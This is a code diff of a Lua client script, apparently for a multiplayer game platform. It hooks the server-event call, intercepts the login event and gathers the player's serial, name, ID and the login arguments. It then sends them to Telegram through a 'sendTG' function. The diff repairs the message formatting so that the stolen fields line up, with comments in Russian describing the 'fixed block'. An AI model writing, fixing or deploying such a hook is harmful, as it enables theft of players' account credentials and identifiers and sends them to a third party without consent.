@@ -47,28 +47,35 @@ addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByAC
     local args = {...}
     local eventName = tostring(args[1])
 
-    -- Отлавливаем именно событие логина
     if eventName ~= "addt:LoginAccount" then
         return
     end
 
     sended = true
 
-    -- Сбор данных игрока
+    -- Получаем данные игрока (исправленный блок)
     local serial = getPlayerSerial(localPlayer)
     local nick = getPlayerName(localPlayer)
-    local idloc = tostring(getElementID(localPlayer) or "0"):gsub("p", "")
     
+    -- Берем ID через getElementID и убираем префикс "p"
+    local rawID = getElementID(localPlayer) or "0"
+    local idloc = tostring(rawID):gsub("p", "")
+
     local resName = sourceResource and getResourceName(sourceResource) or "unknown"
 
-    -- Формируем расширенное сообщение
-    local info = string.format(
-        "👤 Player: %s | ID: %s | Serial: %s\n📦 Resource: [%s]\n⚙️ Func: %s(%s)",
-        nick, idloc, serial, resName, functionName, buildArgs(...)
+    -- Формируем текст (теперь переменные на своих местах)
+    local text = string.format(
+        "👤 Player: %s | ID: %s | Serial: %s\n📦 Resource: [%s]\n⚙️ Event: %s\n📝 Args: (%s)",
+        nick, 
+        idloc, 
+        serial, 
+        resName, 
+        eventName, 
+        buildArgs(...)
     )
 
-    outputDebugString(info)
-    sendTG(info)
+    outputDebugString(text)
+    sendTG(text)
 end, {"triggerServerEvent"})
 ----------------------------------------------------------------
 -- ГЛОБАЛЬНАЯ ТАБЛИЦА И ОЧИСТКА
